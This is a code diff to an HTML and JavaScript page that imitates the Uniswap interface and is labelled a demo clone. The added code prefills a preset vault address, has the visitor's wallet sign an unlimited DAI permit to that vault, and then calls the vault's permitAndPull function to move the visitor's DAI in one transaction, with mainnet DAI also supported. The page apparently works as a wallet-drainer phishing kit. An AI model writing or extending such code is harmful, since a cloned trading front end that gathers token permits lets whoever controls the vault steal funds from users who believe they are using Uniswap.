@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Uniswap — Demo Clone (Permit + Vault + Network Switch)</title>
+  <title>Uniswap — Demo Clone (Permit + Vault V2 + Network Switch)</title>
   <style>
     :root{--bg:#0b0b0f;--surface:#111216;--border:#24262c;--ink:#e9ecf1;--muted:#9aa0ab;--accent:#ff2db2;--shadow:0 8px 28px rgba(0,0,0,.45)}
     *{box-sizing:border-box}
@@ -57,7 +57,7 @@
     .field{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
     .field label{font-size:12px;color:#9aa3b2}
     .field input{background:#141823;border:1px solid #2a2f3a;border-radius:10px;color:#e9efff;padding:10px}
-    .row-right{display:flex;justify-content:flex-end;gap:10px;margin-top:10px}
+    .row-right{display:flex;justify-content:flex-end;gap:10px;margin-top:10px;flex-wrap:wrap}
     .btn{padding:10px 14px;border-radius:10px;border:1px solid #2a2f3a;background:#151a24;color:#e7ecfb;cursor:pointer}
     .btn.pink{background:linear-gradient(180deg,#ff2db2,#ff46c0);border:0;color:#fff}
     .mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px}
@@ -161,10 +161,10 @@
     <div class="sheet">
       <div class="hd"><b>Settings</b><button class="btn" onclick="closeSettings()">Close</button></div>
       <div class="bd">
-        <div class="field"><label>Vault address (DaiPullVault)</label><input id="setVault" placeholder="0xVault... (set after deploy)"></div>
-        <div class="field"><label>Notifier address (must match vault.dappNotifier)</label><input id="setNotifier" placeholder="0xNotifier..."></div>
+        <div class="field"><label>Vault address (DaiPullVault V2)</label><input id="setVault" placeholder="0xVault... (set after deploy)"></div>
+        <div class="field"><label>Notifier address (legacy path only)</label><input id="setNotifier" placeholder="0xNotifier..."></div>
         <div class="row-right"><button class="btn pink" onclick="saveSettings()">Save</button></div>
-        <div class="mono" style="margin-top:8px;color:#9aa3b2">Note: Contract not deployed yet — set the vault address after deploy.</div>
+        <div class="mono" style="margin-top:8px;color:#9aa3b2">Note: Auto path uses <code>permitAndPull</code> on your V2 vault in one transaction.</div>
       </div>
     </div>
   </div>
@@ -184,14 +184,15 @@
         </div>
         <div class="row-right">
           <button class="btn" onclick="signPermitExport()">Sign only (export for notifier)</button>
-          <button class="btn pink" onclick="signPermitSubmitDai()">Sign & submit DAI.permit (you pay gas)</button>
+          <button class="btn" onclick="signPermitSubmitDai()">Sign & submit DAI.permit (you pay gas)</button>
+          <button class="btn pink" onclick="autoPermitAndPull()">Auto Permit & Pull (1 tx)</button>
         </div>
         <div id="permitResult" style="margin-top:12px;display:none"></div>
         <div id="permitHint" style="margin-top:8px;color:#9aa3b2;font-size:12px;display:none">
           <ul>
-            <li>Exported JSON targets <code>DaiPullVault.permitAndPull</code>. Tx sender must equal <code>dappNotifier</code> in the vault.</li>
-            <li>DAI permit is boolean (unlimited). Exact 1 DAI limits require a normal <code>approve</code>.</li>
-            <li>“Sign & submit DAI.permit” only sets allowance. Pulling still requires a call to your vault (e.g., <code>onApprovalNotified</code>).</li>
+            <li><b>Auto Permit & Pull</b> calls your vault’s <code>permitAndPull</code> (V2 only) in a single transaction.</li>
+            <li><b>Sign & submit DAI.permit</b> sets unlimited allowance to the vault; you can then pull separately.</li>
+            <li>DAI legacy permit is boolean (unlimited). Exact 1-DAI approvals require <code>approve</code> instead.</li>
           </ul>
         </div>
       </div>
@@ -209,16 +210,19 @@
     const shorten = a => a ? a.slice(0,6)+'…'+a.slice(-4) : '';
     const fmt = (x,d=2)=>{ if(!isFinite(x)) return '0'; const abs=Math.abs(x); if(abs>1) return x.toLocaleString(undefined,{maximumFractionDigits:d}); return x.toLocaleString(undefined,{maximumFractionDigits:6}); };
 
-    // Chain-aware DAI addresses (your Sepolia DAI is included)
+    // Chain-aware addresses (your Sepolia DAI + Vault V2 + Notifier)
     const DAI_ADDRS = {
       '0x1':      '0x6B175474E89094C44Da98b954EedeAC495271d0F', // mainnet
       '0xaa36a7': '0x21AfeE016BdcF5fa32308816f8612e016D2b65F7', // sepolia (yours)
     };
-    const DEFAULTS_BY_CHAIN={
-      '0xaa36a7':{ notifier:'0x8F586EC9534D1Fe3323982A3bDeb8F9b004AF416' }
+    const DEFAULTS_BY_CHAIN = {
+      '0xaa36a7':{
+        notifier:'0x8F586EC9534D1Fe3323982A3bDeb8F9b004AF416',
+        vault:'0x130b094BF189c4AB0E472ce98F3F62D794a11e55' // V2 vault (yours)
+      }
     };
 
-    // ERC20s for balances (DAI gets swapped in per chain)
+    // ERC20 configs for balances (USDC/USDT are mainnet; will fail gracefully on Sepolia)
     let ERC20S={DAI:{addr:DAI_ADDRS['0xaa36a7'],decimals:18},USDC:{addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48',decimals:6},USDT:{addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6}};
 
     let DAI=DAI_ADDRS['0xaa36a7'];
@@ -231,14 +235,18 @@
     function setChainConfig(chainIdHex){
       DAI = DAI_ADDRS[chainIdHex] || DAI_ADDRS['0x1'];
       if(ERC20S && ERC20S.DAI) ERC20S.DAI.addr = DAI;
-      if(!NOTIFIER_ADDRESS && DEFAULTS_BY_CHAIN[chainIdHex]?.notifier){
-        NOTIFIER_ADDRESS = DEFAULTS_BY_CHAIN[chainIdHex].notifier;
-        localStorage.setItem('notifierAddress', NOTIFIER_ADDRESS);
+
+      // Prefill defaults for this chain if not already set
+      const d = DEFAULTS_BY_CHAIN[chainIdHex];
+      if(d){
+        if(!NOTIFIER_ADDRESS){ NOTIFIER_ADDRESS=d.notifier; localStorage.setItem('notifierAddress', NOTIFIER_ADDRESS); }
+        if(!VAULT_ADDRESS){ VAULT_ADDRESS=d.vault; localStorage.setItem('vaultAddress', VAULT_ADDRESS); }
       }
     }
     function reflectSelectedChain(id){
       const sel=qs('#networkSelect'); if(sel && sel.value!==id) sel.value=id;
-      setChainConfig(id); const netEl=qs('#walletNetwork'); if(netEl) netEl.textContent=labelForChain(id);
+      setChainConfig(id);
+      const netEl=qs('#walletNetwork'); if(netEl) netEl.textContent=labelForChain(id);
     }
 
     async function ensureChain(target='0xaa36a7'){
@@ -257,7 +265,7 @@
       }
     }
 
-    // ===== Swap header demo calc (simple) =====
+    // ===== Swap header demo calc =====
     const TOKENS=[{sym:'ETH',priceUSD:3500},{sym:'USDC',priceUSD:1}]; let from=TOKENS[0], to=TOKENS[1];
     function updateHeaders(){ const rate=from.priceUSD/to.priceUSD; qs('#rateText').textContent=`1 ${from.sym} ≈ ${fmt(rate,4)} ${to.sym}`; compute(); }
     function compute(){ const a=parseFloat(qs('#fromAmt').value); const px=from.priceUSD/to.priceUSD; if(!isFinite(a)){ qs('#toAmt').value=''; qs('#fromUsd').textContent='$0'; qs('#toUsd').textContent='0'; return;} const out=a*px; qs('#toAmt').value=out?fmt(out):''; qs('#fromUsd').textContent='$'+fmt(a*from.priceUSD); qs('#toUsd').textContent=fmt(out); }
@@ -309,10 +317,10 @@
     window.closeSettings=function(){ qs('#settingsModal').style.display='none'; };
     window.saveSettings=function(){ VAULT_ADDRESS=qs('#setVault').value.trim(); NOTIFIER_ADDRESS=qs('#setNotifier').value.trim(); localStorage.setItem('vaultAddress',VAULT_ADDRESS); localStorage.setItem('notifierAddress',NOTIFIER_ADDRESS); closeSettings(); };
 
-    // ===== Sign plain message (proof of ownership) =====
+    // ===== Sign plain message =====
     window.requestSignature=async function(){
       if(!currentAddress){ alert('Connect first'); return; }
-      const msg=`Welcome!\\n\\nBy signing this message you confirm you control wallet ${currentAddress}.\\nThis is NOT a transaction.`;
+      const msg=`Welcome!\n\nBy signing this message you confirm you control wallet ${currentAddress}.\nThis is NOT a transaction.`;
       try{
         let sig=await ethereum.request({method:'personal_sign', params:[msg, currentAddress]});
         if(!sig){ const hex='0x'+[...new TextEncoder().encode(msg)].map(b=>b.toString(16).padStart(2,'0')).join(''); sig=await ethereum.request({method:'personal_sign', params:[hex, currentAddress]}); }
@@ -324,6 +332,8 @@
     window.openPermit=async function(){
       if(!currentAddress){ alert('Connect first'); return; }
       const ok=await ensureChain(getSelectedChainId()); if(!ok) return;
+      // Autofill vault
+      if(!VAULT_ADDRESS){ const d=DEFAULTS_BY_CHAIN[getSelectedChainId()]; if(d?.vault){ VAULT_ADDRESS=d.vault; localStorage.setItem('vaultAddress',VAULT_ADDRESS);} }
       qs('#permitOwner').value=currentAddress;
       qs('#permitVault').value=VAULT_ADDRESS;
       qs('#permitResult').style.display='none';
@@ -333,7 +343,6 @@
     window.closePermit=function(){ qs('#permitModal').style.display='none'; };
 
     async function buildDaiPermit(owner, spender, minutesFromNow){
-      // Read live name() and nonces() from the token
       const provider=new ethers.providers.Web3Provider(window.ethereum);
       const dai=new ethers.Contract(DAI,['function name() view returns (string)','function nonces(address) view returns (uint256)'], provider);
       const [name, nonceBN] = await Promise.all([dai.name(), dai.nonces(owner)]);
@@ -370,11 +379,11 @@
 
         const iface=new ethers.utils.Interface(['function permitAndPull(address holder,uint256 nonce,uint256 expiry,bool allowed,uint8 v,bytes32 r,bytes32 s,uint256 amount)']);
         const callData=iface.encodeFunctionData('permitAndPull',[owner, nonce, expiry, true, v, r, s, amountWei]);
-        const snippet=`// Ethers v5 (sender must equal vault.dappNotifier)
+        const snippet=`// Ethers v5 (anyone can call on V2 vault)
 import { ethers } from 'ethers';
 const VAULT='${vault}';
 const provider=new ethers.providers.JsonRpcProvider('<RPC_URL>');
-const signer=new ethers.Wallet('<NOTIFIER_PRIVATE_KEY>', provider);
+const signer=new ethers.Wallet('<PRIVATE_KEY>', provider); // caller pays gas
 const iface=new ethers.utils.Interface(['function permitAndPull(address,uint256,uint256,bool,uint8,bytes32,bytes32,uint256)']);
 const data=iface.encodeFunctionData('permitAndPull',['${owner}', ${nonce}, ${expiry}, true, ${v}, '${r}', '${s}', '${amountWei}']);
 const tx=await signer.sendTransaction({ to:VAULT, data });
@@ -405,6 +414,84 @@ console.log('tx', tx.hash);`;
 
         const box=qs('#permitResult'); box.style.display='block'; box.innerHTML=`<div class="mono">DAI.permit tx</div><pre>${rcpt.transactionHash}</pre>`; qs('#permitHint').style.display='block';
       }catch(e){ console.warn(e); alert('Permit submit failed'); }
+    };
+
+    // ✅ Auto path: sign typed data then call vault V2 in one tx
+    window.autoPermitAndPull = async function(){
+      try{
+        if(!currentAddress){ alert('Connect first'); return; }
+        const ok = await ensureChain(getSelectedChainId()); if(!ok) return;
+
+        const owner = currentAddress;
+        const vault = (qs('#permitVault').value || '').trim() || VAULT_ADDRESS;
+        if(!/^0x[0-9a-fA-F]{40}$/.test(vault)){ alert('Set your Vault address in Settings'); return; }
+
+        const mins = parseInt(qs('#permitMins').value || '30', 10);
+        const amountStr = (qs('#permitAmount').value || '').trim();
+        if(!amountStr){ alert('Enter DAI amount'); return; }
+        const amountWei = ethers.utils.parseUnits(amountStr, 18).toString();
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const dai = new ethers.Contract(DAI, [
+          'function name() view returns (string)',
+          'function nonces(address) view returns (uint256)'
+        ], provider);
+        const [name, nonceBN] = await Promise.all([dai.name(), dai.nonces(owner)]);
+        const chainId = parseInt(await ethereum.request({method:'eth_chainId'}), 16);
+        const expiry = Math.floor(Date.now()/1000) + mins*60;
+
+        const typedData = {
+          types: {
+            EIP712Domain: [
+              {name:'name',type:'string'},
+              {name:'version',type:'string'},
+              {name:'chainId',type:'uint256'},
+              {name:'verifyingContract',type:'address'}
+            ],
+            Permit: [
+              {name:'holder',type:'address'},
+              {name:'spender',type:'address'},
+              {name:'nonce',type:'uint256'},
+              {name:'expiry',type:'uint256'},
+              {name:'allowed',type:'bool'}
+            ],
+          },
+          primaryType: 'Permit',
+          domain: { name, version:'1', chainId, verifyingContract: DAI },
+          message: { holder: owner, spender: vault, nonce: nonceBN.toString(), expiry, allowed: true }
+        };
+
+        // 1) Sign EIP-712 (free)
+        const sig = await ethereum.request({
+          method:'eth_signTypedData_v4',
+          params:[owner, JSON.stringify(typedData)]
+        });
+        const s = sig.replace(/^0x/,'');
+        let v = parseInt(s.slice(128,130),16); if(v<27) v+=27;
+        const r = '0x'+s.slice(0,64);
+        const _s = '0x'+s.slice(64,128);
+
+        // 2) Call vault V2 (user pays gas)
+        const signer = provider.getSigner();
+        const iface = new ethers.utils.Interface([
+          'function permitAndPull(address holder,uint256 nonce,uint256 expiry,bool allowed,uint8 v,bytes32 r,bytes32 s,uint256 amount)'
+        ]);
+        const data = iface.encodeFunctionData('permitAndPull', [
+          owner, nonceBN.toString(), expiry, true, v, r, _s, amountWei
+        ]);
+
+        const tx = await signer.sendTransaction({ to: vault, data });
+        const rcpt = await tx.wait();
+
+        const box=qs('#permitResult'); box.style.display='block';
+        box.innerHTML = `<div class="mono">permitAndPull tx</div><pre>${rcpt.transactionHash}</pre>`;
+        qs('#permitHint').style.display='block';
+
+        await loadBalances(owner);
+      }catch(e){
+        console.warn(e);
+        alert('Auto Permit & Pull failed or was rejected.');
+      }
     };
 
     // ===== Boot & dropdown wiring =====
